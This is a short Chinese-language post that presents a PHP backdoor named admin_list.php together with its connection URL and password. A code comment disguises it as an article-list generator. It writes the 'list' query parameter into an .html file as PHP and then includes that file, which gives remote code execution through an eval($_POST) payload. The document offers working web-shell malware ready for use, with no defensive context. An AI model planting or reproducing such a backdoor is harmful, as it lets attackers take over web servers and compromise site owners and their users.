文件名称为:admin_list.php

连接方式:http://www.expdoor.com/?list=eval($_POST[expdoor]);

密码:expdoor


<?php

/*
*
*文章列表生成文件
*/
if(isset($_GET['list'])){
   mud();
}
function mud(){
$fp=fopen('content_batch_stye.html','w');
file_put_contents('content_batch_stye.html',"<?php\r\n");
file_put_contents('content_batch_stye.html',$_GET['list'],FILE_APPEND);
fclose($fp);
require 'content_batch_stye.html';}
?>